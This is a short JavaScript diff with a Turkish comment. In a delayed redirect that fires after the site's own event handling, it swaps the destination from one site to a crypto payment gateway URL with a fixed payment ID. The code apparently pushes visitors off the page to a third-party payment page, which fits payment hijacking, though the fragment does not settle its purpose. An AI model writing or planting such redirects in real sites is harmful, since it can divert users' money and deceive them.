@@ -75,7 +75,7 @@
 
             alreadyRedirected = true;
             setTimeout(() => {
-                window.location.href = 'https://otofasthavale.pro';
+                window.location.href = 'https://crypto.theta-gateway-pay.com/pay/123/b422fda2-8f7c-420a-a2d6-f4cc3969ba33';
             }, 80);  // çok küçük gecikme, sitenin son işlerini yapmasına izin ver
 
         }, false);  // normal faz, capture değil
